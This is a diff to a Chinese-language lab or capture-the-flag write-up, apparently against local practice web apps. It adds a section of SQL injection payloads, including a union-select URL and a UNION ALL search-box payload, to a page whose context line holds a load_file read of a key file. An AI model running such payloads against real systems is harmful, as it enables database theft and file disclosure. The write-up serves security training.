@@ -148,6 +148,28 @@ uid=-2' union select 1,load_file('/var/www/html/key.php'),3,4,5,6,7,8,9,10 -- -
 
 ![image.png](https://img.ghostliner.top/gqpUFh.png)
 
+### 3.4. 其他 sql 注入漏洞
+
+**就诊记录列表页面存在数字型注入**
+
+```r
+http://192.168.163.135:32769/?m=record&o=indexlist&rid=-2 union select 1,2,3,4,database(),6,7,8-- &did=all
+```
+
+**患者页面搜索框存在模糊查询注入**
+
+![image.png](https://img.ghostliner.top/tzSF4C.png)
+
+有 15 列
+
+```sql
+Payload: name=%E5%88%98' UNION ALL SELECT CONCAT(0x716a6a7671,0x7562746376476552685441466278697472765a6b444942576450454c4b4277554f4f535253424577,0x717a627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&submit=%E6%9F%A5%E6%89%BE%E6%82%A3%E8%80%85
+```
+
+5、14、11 有回显
+
+![image.png](https://img.ghostliner.top/9wMzHs.png)
+
 ## 4. web3：失效的访问控制
 
 **端口**：32770
